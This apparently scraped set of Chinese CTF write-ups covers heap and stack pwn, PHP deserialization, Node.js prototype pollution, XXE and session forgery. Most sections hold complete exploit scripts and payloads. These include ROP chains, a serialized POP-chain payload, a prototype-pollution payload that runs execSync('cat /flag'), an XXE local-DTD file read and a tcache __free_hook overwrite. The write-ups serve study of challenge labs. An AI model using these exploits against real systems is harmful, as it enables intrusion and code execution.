开始爆破stdout的地址(也只需要爆破一位)，这一块chunk是切割的unsorted bin当中的内容，也就是tcache_struct，下去思考一下就能想到我们爆破的是tcache大小为0x40的指针    create((p64(0xfbad1800)+p64(0)*3+p64(0x60)+b&#x27;\\n&#x27;).ljust(0x30, b&#x27;\\x00&#x27;))# 这一步开始修改结构体内部的值    r.recvuntil(b&#x27;\\n&#x27;)    if u64(r.recv(8)) != 0xfbad1800:        return 0    r.recv(0x20)    stdout = u64(r.recv(6).ljust(0x8, b&#x27;\\x00&#x27;))-131    print(hex(stdout))    # libc = LibcSearcher(&#x27;_IO_2_1_stdout_&#x27;, stdout)    libc = ELF(&#x27;./libc-2.27.so&#x27;)    # success(libc.address)    libc_base = stdout-libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]    pop_rdi = 0x000000000002155f+libc_base    pop_rsi = 0x0000000000023e8a+libc_base    pop_rdx = 0x0000000000001b96+libc_base    push_rsp = 0x0000000000024ef4+libc_base    open_addr = libc_base+libc.symbols[&#x27;open&#x27;]    read_addr = libc_base+libc.symbols[&#x27;read&#x27;]    write_addr = libc_base+libc.symbols[&#x27;write&#x27;]    malloc_hook = libc_base+libc.symbols[&#x27;__malloc_hook&#x27;]    create((p64(malloc_hook)+b&#x27;\\n&#x27;).ljust(0x10, b&#x27;\\x00&#x27;))# 这一步我们又是从unsorted bin当中切出来位置，但因为上面用了0x20所以我们修改的tcache_entry是大小为0x80的chunk。后面就是正常的构造ROP了    create((p64(push_rsp)+b&#x27;/flag&#x27;+b&#x27;\\n&#x27;).ljust(0x70, b&#x27;\\x00&#x27;))    payload = p64(pop_rdi)+p64(malloc_hook+0x8)+p64(open_addr)+p64(pop_rdi) + \\        p64(3)+p64(pop_rdx)+p64(0x50)+p64(pop_rsi) + \\        p64(malloc_hook+10)+p64(puts)+b&#x27;\\n&#x27;    create(payload.ljust(0x70, b&#x27;\\x00&#x27;))if __name__ == &#x27;__main__&#x27;:    while 1:        try:            res = boom()            if(res == 0):                r = process(&#x27;./look_face_no_patch&#x27;)                continue            break        except:            r = process(&#x27;./look_face_no_patch&#x27;)            continue    gdb.attach(r)    r.interactive()\n\n上面代码解释可能难以理解，所以我画了一张图。\n我们将存放tcache_struct的chunk释放进unsorted bin当中的后续情况如下图：\n\n","categories":["比赛复现"],"tags":["pwn"]},{"title":"GYCTF2020_Easyphp","url":"/2021/09/25/GYCTF2020-Easyphp/","content":"获取信息扫目录我的dirsearch不出所料的没扫到www.zip看了wp才知道是有源文件泄漏\n代码审计index.php\n&lt;?phprequire_once &quot;lib.php&quot;;if(isset($_GET[&#x27;action&#x27;]))&#123;\trequire_once(__DIR__.&quot;/&quot;.$_GET[&#x27;action&#x27;].&quot;.php&quot;);&#125;else&#123;\tif($_SESSION[&#x27;login&#x27;]==1)&#123;\t\techo &quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;;\t&#125;\telse&#123;\t\techo &quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;;\t&#125;&#125;?&gt;\n\nlogin.php\n&lt;?phprequire_once(&#x27;lib.php&#x27;);?&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;login&lt;/title&gt;&lt;center&gt;\t&lt;form action=&quot;login.php&quot; method=&quot;post&quot; style=&quot;margin-top: 300&quot;&gt;\t\t&lt;h2&gt;百万前端的用户信息管理系统&lt;/h2&gt;\t\t&lt;h3&gt;半成品系统 留后门的程序员已经跑路&lt;/h3&gt;        \t\t&lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;UserName&quot; required&gt;\t\t&lt;br&gt;\t\t&lt;input type=&quot;password&quot; style=&quot;margin-top: 20&quot; name=&quot;password&quot; placeholder=&quot;password&quot; required&gt;\t\t&lt;br&gt;\t\t&lt;button style=&quot;margin-top:20;&quot; type=&quot;submit&quot;&gt;登录&lt;/button&gt;\t\t&lt;br&gt;\t\t&lt;img src=&#x27;img/1.jpg&#x27;&gt;大家记得做好防护&lt;/img&gt;\t\t&lt;br&gt;\t\t&lt;br&gt;&lt;?php $user=new user();if(isset($_POST[&#x27;username&#x27;]))&#123;\tif(preg_match(&quot;/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i&quot;, $_POST[&#x27;username&#x27;]))&#123;\t\tdie(&quot;&lt;br&gt;Damn you, hacker!&quot;);\t&#125;\tif(preg_match(&quot;/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i&quot;, $_POST[&#x27;password&#x27;]))&#123;\t\tdie(&quot;Damn you, hacker!&quot;);\t&#125;\t$user-&gt;login();&#125;?&gt;\t&lt;/form&gt;&lt;/center&gt;\n\nlib.php\n&lt;?phperror_reporting(0);session_start();function safe($parm)&#123;    $array = array(&#x27;union&#x27;, &#x27;regexp&#x27;, &#x27;load&#x27;, &#x27;into&#x27;, &#x27;flag&#x27;, &#x27;file&#x27;, &#x27;insert&#x27;, &quot;&#x27;&quot;, &#x27;\\\\&#x27;, &quot;*&quot;, &quot;alter&quot;);    return str_replace($array, &#x27;hacker&#x27;, $parm);&#125;class User&#123;    public $id;    public $age = null;    public $nickname = null;    public function login()    &#123;        if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;])) &#123;            $mysqli = new dbCtrl();            $this-&gt;id = $mysqli-&gt;login(&#x27;select id,password from user where username=?&#x27;);            if ($this-&gt;id) &#123;                $_SESSION[&#x27;id&#x27;] = $this-&gt;id;                $_SESSION[&#x27;login&#x27;] = 1;           // target                echo &quot;你的ID是&quot; . $_SESSION[&#x27;id&#x27;];                echo &quot;你好！&quot; . $_SESSION[&#x27;token&#x27;];                echo &quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;;                return $this-&gt;id;            &#125;        &#125;    &#125;    public function update()    &#123;        $Info = unserialize($this-&gt;getNewinfo());        $age = $Info-&gt;age;        $nickname = $Info-&gt;nickname;        $updateAction = new UpdateHelper($_SESSION[&#x27;id&#x27;], $Info, &quot;update user SET age=$age,nickname=$nickname where id=&quot; . $_SESSION[&#x27;id&#x27;]);        //这个功能还没有写完 先占坑    &#125;    public function getNewInfo()    &#123;        $age = $_POST[&#x27;age&#x27;];        $nickname = $_POST[&#x27;nickname&#x27;];        return safe(serialize(new Info($age, $nickname)));    &#125;    public function __destruct()    &#123;        return file_get_contents($this-&gt;nickname); //危    &#125;    public function __toString()    &#123;        // nickname = new Info();        $this-&gt;nickname-&gt;update($this-&gt;age);        return &quot;0-0&quot;;    &#125;&#125;class Info&#123;    public $age;    public $nickname;    public $CtrlCase;    public function __construct($age, $nickname)    &#123;        $this-&gt;age = $age;        $this-&gt;nickname = $nickname;    &#125;    public function __call($name, $argument)    &#123;        // CtrlCase = new dbCtrl();        echo $this-&gt;CtrlCase-&gt;login($argument[0]);        // argument[0] = &#x27;select id,md5(1) from user where username=?&#x27;    &#125;&#125;class UpdateHelper&#123;    public $id;    public $newinfo;    public $sql;    public function __construct($newInfo, $sql)    &#123;        $newInfo = unserialize($newInfo);        $upDate = new dbCtrl();    &#125;    public function __destruct()    &#123;        // sql = new User();        echo $this-&gt;sql;    &#125;&#125;class dbCtrl&#123;    public $hostname = &quot;127.0.0.1&quot;;    public $dbuser = &quot;root&quot;;    public $dbpass = &quot;root&quot;;    public $database = &quot;test&quot;;    public $name;    public $password;    public $mysqli;    public $token;    public function __construct()    &#123;        $this-&gt;name = $_POST[&#x27;username&#x27;];        $this-&gt;password = $_POST[&#x27;password&#x27;];        $this-&gt;token = $_SESSION[&#x27;token&#x27;];    &#125;    public function login($sql)    &#123;        $this-&gt;mysqli = new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);        if ($this-&gt;mysqli-&gt;connect_error) &#123;            die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error);        &#125;        $result = $this-&gt;mysqli-&gt;prepare($sql);        $result-&gt;bind_param(&#x27;s&#x27;, $this-&gt;name);        $result-&gt;execute();        $result-&gt;bind_result($idResult, $passwordResult);        $result-&gt;fetch();        $result-&gt;close();        if ($this-&gt;token == &#x27;admin&#x27;) &#123;            return $idResult;        &#125;        if (!$idResult) &#123;            echo (&#x27;用户不存在!&#x27;);            return false;        &#125;        if (md5($this-&gt;password) !== $passwordResult) &#123;            echo (&#x27;密码错误！&#x27;);            return false;        &#125;        $_SESSION[&#x27;token&#x27;] = $this-&gt;name;        return $idResult;    &#125;    public function update($sql)    &#123;        //还没来得及写    &#125;&#125;\n\nupdate.php\n&lt;?phprequire_once(&#x27;lib.php&#x27;);echo &#x27;&lt;html&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;update&lt;/title&gt;&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;&lt;/html&gt;&#x27;;if ($_SESSION[&#x27;login&#x27;]!=1)&#123;\techo &quot;你还没有登陆呢！&quot;;&#125;$users=new User();$users-&gt;update();if($_SESSION[&#x27;login&#x27;]===1)&#123;\trequire_once(&quot;flag.php&quot;);\techo $flag;&#125;?&gt;\n\n经过审计可以很轻易的发现漏洞点在update.php\n\n即便是上面if语句成立也会执行下面的内容\n\n然后存在反序列化漏洞，开始看见下面存在file_get_contents觉得可以直接获取flag但是是我想多了，上面有个safe函数过滤了flag关键字。\n\n只要我的session文件login为1就可以拿到flag，再看lib.php那里修改了session\n\nUser的login函数会修改$_SESSION[‘login’]=1,但是一定要this-&gt;id存在，所以必定要执行这个sql语句\n\n里面只需要this-&gt;token为admin就可以返回id所以只需要最下面的$_SESSION[‘token’]=$this-&gt;name执行了，后续直接随便登录就行。\n构造pop链由上面可知我们最后需要执行的是dbCtrl-&gt;login()\n往上看有一个很显眼的\n\n看得到这里有一个很刺眼的login，所以在倒数第二步应该是他了(这些赋值的注释是我在做题过程中自己写的一些笔记)\n然后就是找到调用__call的地方\n在User类里面的__toString函数里面存在可以达到目的的调用方式\n\n最后在哪调用__toString也很简单了\n\n这里有一个很明显的echo，所以整条链子都清楚了。\nUpdateHelper-&gt;__destruct==&gt;User-&gt;__toString==&gt;Info-&gt;__call==&gt;dbCtrl-&gt;login\n解题给出exp\n&lt;?phpclass User&#123;    public $age;    public $nickname;    public function __construct()    &#123;        $this-&gt;nickname = new Info();        $this-&gt;age = &#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;;    &#125;&#125;class Info&#123;    public $CtrlCase;    public function __construct()    &#123;        $this-&gt;CtrlCase = new dbCtrl();    &#125;&#125;class UpdateHelper&#123;    public $sql;    public function __construct()    &#123;        $this-&gt;sql = new User();    &#125;&#125;class dbCtrl&#123;    public $name;    public $password;    public function __construct()    &#123;        $this-&gt;name = &#x27;admin&#x27;;        $this-&gt;password = &#x27;1&#x27;;    &#125;&#125;echo serialize(new UpdateHelper());// 这里还需要通过上面的replace来进行字符串逃逸。\n\n最终的payload:\nage=1&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;\n\n","categories":["web-buuctf"],"tags":["pop链"]},{"title":"GYCTF2020_Ez_Express","url":"/2021/10/04/GYCTF2020-Ez-Express/","content":"信息收集打开题目就一个登录注册页面，并没有找到什么。直接扫目录\n扫出info。访问里面显示有一个/www.zip源码泄漏\nindex.js\nvar express = require(&#x27;express&#x27;);var router = express.Router();const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;const merge = (a, b) =&gt; &#123;  for (var attr in b) &#123;    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;      merge(a[attr], b[attr]);    &#125; else &#123;      a[attr] = b[attr];    &#125;  &#125;  return a&#125;const clone = (a) =&gt; &#123;  return merge(&#123;&#125;, a);&#125;function safeKeyword(keyword) &#123;  if (keyword.match(/(admin)/is)) &#123;    return keyword  &#125;  return undefined&#125;router.get(&#x27;/&#x27;, function (req, res) &#123;  if (!req.session.user) &#123;    res.redirect(&#x27;/login&#x27;);  &#125;  res.outputFunctionName = undefined;  res.render(&#x27;index&#x27;, data = &#123; &#x27;user&#x27;: req.session.user.user &#125;);&#125;);router.get(&#x27;/login&#x27;, function (req, res) &#123;  res.render(&#x27;login&#x27;);&#125;);router.post(&#x27;/login&#x27;, function (req, res) &#123;  if (req.body.Submit == &quot;register&quot;) &#123;    if (safeKeyword(req.body.userid)) &#123;      res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;)    &#125;    req.session.user = &#123;      &#x27;user&#x27;: req.body.userid.toUpperCase(),      &#x27;passwd&#x27;: req.body.pwd,      &#x27;isLogin&#x27;: false    &#125;    res.redirect(&#x27;/&#x27;);  &#125;  else if (req.body.Submit == &quot;login&quot;) &#123;    if (!req.session.user) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125;    if (req.session.user.user == req.body.userid &amp;&amp; req.body.pwd == req.session.user.passwd) &#123;      req.session.user.isLogin = true;    &#125;    else &#123;      res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;)    &#125;  &#125;  res.redirect(&#x27;/&#x27;);;&#125;);router.post(&#x27;/action&#x27;, function (req, res) &#123;  if (req.session.user.user != &quot;ADMIN&quot;) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125;  req.session.user.data = clone(req.body);  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);&#125;);router.get(&#x27;/info&#x27;, function (req, res) &#123;  res.render(&#x27;index&#x27;, data = &#123; &#x27;user&#x27;: res.outputFunctionName &#125;);&#125;)module.exports = router;\n\n知识点原型链污染js的考点主要还是原型链污染，这里的merge函数也就是危险函数。\nconst isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;// 上面就是检验参数obj是否是个对象const merge = (a, b) =&gt; &#123;  for (var attr in b) &#123;    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;      merge(a[attr], b[attr]);// 要是b和a的attr属性是一个对象的话就会进行递归    &#125; else &#123;      a[attr] = b[attr];// 将对象b的属性赋值给a    &#125;  &#125;  return a&#125;// 所以根据上面，可以看出来原型对象__proto__会进入递归赋值，然而js的对象寻找属性的规则就是，要是对象本身找不到这个属性就会跟着__proto__链找，直到__proto__为NULL，所以当我们有可控参数的时候就可以让，Object()的__proto__赋上我们想要的键值。const clone = (a) =&gt; &#123;  return merge(&#123;&#125;, a);&#125;// 这就是一个闭包\n\n编码绕过\n可以看到提示有admin用户\nrouter.post(&#x27;/action&#x27;, function (req, res) &#123;  if (req.session.user.user != &quot;ADMIN&quot;) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125;  req.session.user.data = clone(req.body);  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);&#125;);\n\n也许要admin用户才能提交action\nfunction safeKeyword(keyword) &#123;  if (keyword.match(/(admin)/is)) &#123;    return keyword  &#125;  return undefined&#125;router.post(&#x27;/login&#x27;, function (req, res) &#123;  if (req.body.Submit == &quot;register&quot;) &#123;    if (safeKeyword(req.body.userid)) &#123;// 但是这里可以看到要是直接提交admin会被过滤这里用特殊字符绕过      res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;)    &#125;    req.session.user = &#123;      &#x27;user&#x27;: req.body.userid.toUpperCase(),      &#x27;passwd&#x27;: req.body.pwd,      &#x27;isLogin&#x27;: false    &#125;    res.redirect(&#x27;/&#x27;);  &#125;  else if (req.body.Submit == &quot;login&quot;) &#123;    if (!req.session.user) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125;    if (req.session.user.user == req.body.userid &amp;&amp; req.body.pwd == req.session.user.passwd) &#123;      req.session.user.isLogin = true;    &#125;    else &#123;      res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;)    &#125;  &#125;  res.redirect(&#x27;/&#x27;);;&#125;);\n\n\n特殊字符绕过\ntoUpperCase()\n这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。\ntoLowerCase()\n这个”K”的“小写”字符是k，也就是”K”.toLowerCase() == ‘k’.\n\n解题首先使用admın,绕过注册绕过safeKeyword\nrouter.get(&#x27;/&#x27;, function (req, res) &#123;  if (!req.session.user) &#123;    res.redirect(&#x27;/login&#x27;);  &#125;  res.outputFunctionName = undefined;  res.render(&#x27;index&#x27;, data = &#123; &#x27;user&#x27;: req.session.user.user &#125;);&#125;);router.post(&#x27;/action&#x27;, function (req, res) &#123;  if (req.session.user.user != &quot;ADMIN&quot;) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125;  req.session.user.data = clone(req.body);// 这里存在原型链污染  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);&#125;);router.get(&#x27;/info&#x27;, function (req, res) &#123;  res.render(&#x27;index&#x27;, data = &#123; &#x27;user&#x27;: res.outputFunctionName &#125;);// 这里调用了outputFunctionName属性，但是在&quot;/&quot;路由里面让这个属性等于了undefined所以只需要污染这个属性就可以实现SSTI&#125;)\n\npayload:&#123;&quot;lua&quot;:&quot;python&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;// 注意要将POST的enctype换成application/json才能当作对象解析\n","categories":["web-buuctf"],"tags":["原型链污染"]},{"title":"GoogleCTF2019_Quals_Bnv","url":"/2021/10/18/GoogleCTF2019-Quals-Bnv/","content":"拿到题目束手无策，扫描后无果直接看了wp，知道这是xxe\n\n江湖流传，有json的地方就有可能有xxe\n\n显示没有DTD，那就加一个\n\n没有声明这个element\n\n发现正常了,习惯性file协议看一下发现无果，看看可不可以引用内部文件\n\n\n不是标记语法，说被加载但是被断了，试试外部加载\n\n同样不行。但是根据这里会显示完整的实体名字，在加上上面已经加载了内容那就可以综合利用起来\n引用本地DTD文件\n这是ubuntu 系统自带的/usr/share/yelp/dtd/docbookx.dtd的部分内容，内部定义了一些实体，我们只需要覆盖之后就行了。\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message[    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % ISOamso &#x27;        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;                    \t&lt;!-- 这里呢，就是通过file协议读取flag --&gt;        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;        \t&lt;!-- 这里很好看出来，就是直接利用报错会显示完整的实体名字，把在上面读取的flag加载进去就行了 --&gt;        &amp;#x25;eval;        &amp;#x25;error;&#x27;&gt;%local_dtd;]&gt;\n\n引用文章https://www.freebuf.com/vuls/207639.html\n","categories":["web-buuctf"],"tags":["xxe"]},{"title":"HarekazeCTF2019_Easy_Notes","url":"/2021/11/02/HarekazeCTF2019-Easy-Notes/","content":"题目给了源码，emmm只不过感觉很多题都有github链接，但是题目并没说什么题目有源码，害我每次都在那儿像个啥子一样找半天。\n代码审计flag.php&lt;section&gt;  &lt;h2&gt;Get flag&lt;/h2&gt;  &lt;p&gt;    &lt;?php    if (is_admin()) &#123;      echo &quot;Congratulations! The flag is: &lt;code&gt;&quot; . getenv(&#x27;FLAG&#x27;) . &quot;&lt;/code&gt;&quot;;    &#125; else &#123;      echo &quot;You are not an admin :(&quot;;    &#125;    ?&gt;  &lt;/p&gt;&lt;/section&gt;lib.phpfunction is_admin() &#123;  if (!isset($_SESSION[&#x27;admin&#x27;])) &#123;    return false;  &#125;  return $_SESSION[&#x27;admin&#x27;] === true;&#125;\n\n需要session为admin===true\nlib.php里们没找到什么可以修改session文件的函数，但是在export.php里面存在操作文件的东西\n&lt;?phprequire_once(&#x27;init.php&#x27;);if (!is_logged_in()) &#123;  redirect(&#x27;/?page=home&#x27;);&#125;$notes = get_notes();if (!isset($_GET[&#x27;type&#x27;]) || empty($_GET[&#x27;type&#x27;])) &#123;  $type = &#x27;zip&#x27;;&#125; else &#123;  $type = $_GET[&#x27;type&#x27;];&#125;$filename = get_user() . &#x27;-&#x27; . bin2hex(random_bytes(8)) . &#x27;.&#x27; . $type;$filename = str_replace(&#x27;..&#x27;, &#x27;&#x27;, $filename); // avoid path traversal$path = TEMP_DIR . &#x27;/&#x27; . $filename;if ($type === &#x27;tar&#x27;) &#123;  $archive = new PharData($path);  $archive-&gt;startBuffering();&#125; else &#123;  // use zip as default  $archive = new ZipArchive();  $archive-&gt;open($path, ZIPARCHIVE::CREATE | ZipArchive::OVERWRITE);&#125;for ($index = 0; $index &lt; count($notes); $index++) &#123;  $note = $notes[$index];  $title = $note[&#x27;title&#x27;];  $title = preg_replace(&#x27;/[^!-~]/&#x27;, &#x27;-&#x27;, $title);  $title = preg_replace(&#x27;#[/\\\\?*.]#&#x27;, &#x27;-&#x27;, $title); // delete suspicious characters  $archive-&gt;addFromString(&quot;&#123;$index&#125;_&#123;$title&#125;.json&quot;, json_encode($note));&#125;if ($type === &#x27;tar&#x27;) &#123;  $archive-&gt;stopBuffering();&#125; else &#123;  $archive-&gt;close();&#125;header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27; . $filename . &#x27;&quot;;&#x27;);header(&#x27;Content-Length: &#x27; . filesize($path));header(&#x27;Content-Type: application/zip&#x27;);readfile($path);\n\n利用过程以sess_ 登录，那么在export的filename当中，get_user()就会返回sess再将type=.因为下面的字符串替换就会把后面’.’给弄没了。\n网上的exp:\nimport reimport requestsURL = &#x27;http://2c84bf34-ac3c-4a8e-8f77-7868da243209.node4.buuoj.cn:81/&#x27;while True:    # login as sess_    sess = requests.Session()    sess.post(URL + &#x27;login.php&#x27;, data=&#123;        &#x27;user&#x27;: &#x27;sess_&#x27;    &#125;)    # make a crafted note    sess.post(URL + &#x27;add.php&#x27;, data=&#123;        &#x27;title&#x27;: &#x27;|N;admin|b:1;&#x27;,        &#x27;body&#x27;: &#x27;hello&#x27;    &#125;)    # make a fake session    r = sess.get(URL + &#x27;export.php?type=.&#x27;).headers[&#x27;Content-Disposition&#x27;]    print(r)    sessid = re.findall(r&#x27;sess_([0-9a-z-]+)&#x27;, r)[0]    print(sessid)    # get the flag    r = requests.get(URL + &#x27;?page=flag&#x27;, cookies=&#123;        &#x27;PHPSESSID&#x27;: sessid    &#125;).content.decode(&#x27;utf-8&#x27;)    flag = re.findall(r&#x27;flag\\&#123;.+\\&#125;&#x27;, r)    if len(flag) &gt; 0:        print(flag[0])        break\n\n","categories":["web-buuctf"],"tags":["session伪造"]},{"title":"MT-CTF2021复现","url":"/2021/12/14/MT-CTF/","content":"比赛当天给我哥过生日去了，没时间打比赛，下来复现比赛发现三道pwn题的难度都不是很难，除了最后一道，还没想到预期解，只能跟着wp做一遍非预期解\nbabyrop预备知识栈迁移\n流程分析程序的流程比较简单，首先存在一个字节的溢出，可以查看canary。然后让你比较password的地址，就可以进入漏洞函数。但是漏洞函数只存在八个字节的溢出\n利用分析因为我们只能溢出一个所以直接构造ROP是行不通的，所以考虑把ROP写到bss上面，直接放exp吧。\nexpfrom pwn import *elf = ELF(&#x27;./babyrop&#x27;)libc = ELF(&#x27;./libc-2.27.so&#x27;)r = process(&#x27;./babyrop&#x27;)context.log_level = &#x27;debug&#x27;# context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]main_addr = elf.symbols[&#x27;main&#x27;]pop_rdi_ret = 0x0000000000400913ret_addr = 0x0000000000400284puts_got_addr = elf.got[&#x27;puts&#x27;]puts_plt_addr = elf.plt[&#x27;puts&#x27;]fake_stack = elf.bss()+0x320vuln_addr = 0x40072Cr.recvuntil(b&#x27;What your name? &#x27;)r.sendline(b&#x27;a&#x27;*(0x20-0x8+1))# gdb.attach(r)print(r.recvuntil(b&#x27;a&#x27;*(0x20-0x8+1)))# canary = (b&#x27;\\x00&#x27;+r.recvuntil(b&#x27;, welcome to this challenge!\\n&#x27;))canary = u64(b&#x27;\\x00&#x27;+r.recv(7))print(hex(canary))# print(u64(r.recvuntil(b&#x27;, welcome to this challenge!\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;)))r.recvuntil(b&#x27;Please input the passwd to unlock this challenge&#x27;)r.sendline(b&#x27;4196782&#x27;)payload = b&#x27;a&#x27;*(0x20-0x8)+p64(canary)+p64(fake_stack)+p64(vuln_addr)r.recvuntil(b&#x27;OK!\\nNow, you can input your message&#x27;)r.sendline(payload)payload = p64(puts_got_addr)+p64(puts_plt_addr)+p64(vuln_addr) + \\    p64(canary)+p64(fake_stack-0x30)+p64(vuln_addr)r.send(payload)# gdb.attach(r)payload = b&#x27;a&#x27;*(0x20-0x8)+p64(canary)+p64(fake_stack-0x20)+p64(pop_rdi_ret)r.send(payload)puts_addr = u64(p.recv(6).ljust(8, &#x27;\\x00&#x27;))libc_base = puts_addr-libc.symbols[&#x27;puts&#x27;]one_gadget = libc_base+0x4f3d5payload = b&#x27;a&#x27;*0x18+p64(canary)+p64(0)+p64(one_gadget)r.send(payload)r.interactive()\n\nbook_shop流程分析题目创建chunk的大小是固定的，并且libc的版本存在tcache，并且只有create存在写入内存的功能\n利用分析首先创建十一个大小为fastbin以内的chunk，释放7个chunk占满tcache，随后释放两个连续的chunk进入fastbin，然后触发malloc_consolidate使fastbin里的chunk合并进入unsortedbin，众所周知，unsortedbin只有一个chunk时，他的fd和bk都指向了main_arena，又因为存在UAF所以直接可以泄漏出libc的加载地址。然后再利用double free释放两个chunk进入fastbin，此时create七个chunk将tcache腾空，那么fastbin的chunk会进入tcache，接着利用double free修改tcache最后那个chunk的fd指针到__free_hook，因为tcache对于安全检测几乎没有就可以直接篡改掉__free_hook然后getshell。下面放出exp\nexpfrom pwn import *r = process(&#x27;./bookshop&#x27;)elf = ELF(&#x27;./bookshop&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)r.recvuntil(b&#x27;The lucky number?\\n&#x27;)r.sendline(bytes(str(0x68), encoding=&#x27;utf8&#x27;))def create(content):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;&gt; &#x27;)    r.send(content)def show(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Which Book do you want to read?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def delete(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Which Book do you want to take out from you bag?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))for i in range(11):    create(b&#x27;a&#x27;)for i in range(7):    delete(6-i)delete(7)delete(8)r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;0&#x27;*0x400)show(7)r.recvuntil(b&#x27;Content: &#x27;)main_arena = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena))main_arena = main_arena-304print(hex(main_arena))# print(u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)))libc_base = 